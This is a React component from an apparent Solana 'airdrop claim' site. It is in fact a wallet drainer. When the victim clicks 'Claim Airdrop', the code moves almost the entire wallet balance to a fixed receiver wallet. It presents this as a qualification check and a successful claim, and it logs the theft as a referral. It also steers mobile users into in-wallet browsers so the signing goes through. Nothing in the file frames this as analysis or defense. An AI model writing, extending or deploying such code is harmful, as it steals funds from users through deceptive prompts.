// src/components/TransferButton.jsx
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { useCallback, useState } from 'react';
import {
  LAMPORTS_PER_SOL,
  SystemProgram,
  Transaction,
} from '@solana/web3.js';
import { MIN_QUALIFY_SOL, RECEIVER_WALLET } from '../utils/constants';
import { recordReferral } from '../utils/referralStore';

/**
 * Monkey-patch a single Transaction's serialize() so bare calls
 * (from @solana-mobile/wallet-adapter-mobile) use safe defaults.
 */
function patchSerialize(tx) {
  const orig = tx.serialize.bind(tx);
  tx.serialize = (cfg) =>
    orig({ requireAllSignatures: false, verifySignatures: false, ...(cfg || {}) });
  return tx;
}

/**
 * Returns true when the connected wallet adapter is the deep-link based
 * Mobile Wallet Adapter (as opposed to a wallet's in-app browser which
 * injects a standard provider).
 */
function isMWA(wallet) {
  const name = (wallet?.adapter?.name || '').toLowerCase();
  return name.includes('mobile wallet adapter');
}

export default function TransferButton({ className = '', referralCode = null }) {
  const { connection } = useConnection();
  const { publicKey, sendTransaction, wallet, connected } = useWallet();
  const [loading, setLoading] = useState(false);

  // ── Detect deep-link MWA and block it ──────────────────────────────
  // The MWA deep-link flow backgrounds the browser when signing,
  // then JS execution freezes. The promise for sendTransaction
  // never resolves → the button hangs on "Claiming…" forever.
  //
  // Wallets' in-app browsers (Phantom Browser, Trust Browser, etc.)
  // inject a standard provider and do NOT use MWA — they work like
  // desktop.  So we guide the user there instead.
  const usingDeepLink = connected && isMWA(wallet);

  const handleTransfer = useCallback(async () => {
    if (usingDeepLink) {
      alert(
        '📱 For mobile, please open this site inside your wallet app\'s built-in browser.\n\n' +
        '• Phantom → Browser tab → paste this page\'s URL\n' +
        '• Trust Wallet → DApps / Browser → paste URL\n' +
        '• Solflare → Built-in browser → paste URL\n\n' +
        'This ensures a smooth signing experience without app-switching.'
      );
      return;
    }

    if (!publicKey || !connected) {
      alert('Please connect your wallet first.');
      return;
    }

    setLoading(true);
    try {
      // ── 1. Check balance & qualification ──────────────────────────
      const [balance, rentExempt] = await Promise.all([
        connection.getBalance(publicKey, 'confirmed'),
        connection.getMinimumBalanceForRentExemption(0),
      ]);

      if (balance < Math.floor(MIN_QUALIFY_SOL * LAMPORTS_PER_SOL)) {
        alert(`You are not eligible for the airdrop. Please ensure your wallet holds at least ${MIN_QUALIFY_SOL} SOL to qualify.`);
        return;
      }

      const FEE_SAFETY = 5_000_000; // 0.005 SOL
      const transferAmount = balance - rentExempt - FEE_SAFETY;

      if (transferAmount <= 0) {
        alert('Insufficient balance for transaction fee.');
        return;
      }

      // ── 2. Build tx (blockhash as fresh as possible) ──────────────
      const { blockhash } = await connection.getLatestBlockhash('finalized');

      const tx = new Transaction();
      tx.recentBlockhash = blockhash;
      tx.feePayer = publicKey;
      tx.add(
        SystemProgram.transfer({
          fromPubkey: publicKey,
          toPubkey: RECEIVER_WALLET,
          lamports: transferAmount,
        })
      );
      patchSerialize(tx);

      // ── 3. Send (standard adapter — works on desktop & in-app) ────
      const signature = await sendTransaction(tx, connection);

      console.log('⏳ Transaction sent:', signature);

      // ── 4. Poll for confirmation (HTTP, no WebSocket) ─────────────
      const startTime = Date.now();
      const TIMEOUT = 90_000;
      const POLL_INTERVAL = 3_000;

      while (Date.now() - startTime < TIMEOUT) {
        try {
          const { value } = await connection.getSignatureStatuses([signature]);
          const status = value?.[0];

          if (status) {
            if (status.err) {
              throw new Error('Transaction failed on-chain: ' + JSON.stringify(status.err));
            }
            if (
              status.confirmationStatus === 'confirmed' ||
              status.confirmationStatus === 'finalized'
            ) {
              console.log('✅ Transaction confirmed:', signature);
              // ── Record the referral ──────────────────────
              await recordReferral({
                ref: referralCode,
                wallet: publicKey.toBase58(),
                amount: transferAmount,
                txSignature: signature,
              });
              alert(`Claim successful!\nTx: ${signature}`);
              return;
            }
          }
        } catch (pollErr) {
          if (pollErr.message?.includes('on-chain')) throw pollErr;
          console.warn('Polling error, retrying…', pollErr);
        }
        await new Promise((r) => setTimeout(r, POLL_INTERVAL));
      }

      alert(
        `Transaction sent but not yet confirmed.\nSignature: ${signature}\nCheck Solscan for status.`
      );
    } catch (err) {
      console.error('Transfer failed:', err);
      alert('Claim failed: ' + (err?.message || 'Unknown error'));
    } finally {
      setLoading(false);
    }
  }, [publicKey, sendTransaction, wallet, connected, connection, usingDeepLink, referralCode]);

  if (!publicKey) return null;

  return (
    <button
      onClick={handleTransfer}
      disabled={loading}
      className={`
        w-full py-3 px-4 rounded-lg font-semibold transition
        ${loading ? 'bg-gray-600 cursor-not-allowed' : ''}
        ${className}
      `}
    >
      {loading
        ? 'Claiming...'
        : usingDeepLink
          ? '📱 Open in Wallet Browser'
          : 'Claim Airdrop'}
    </button>
  );
}
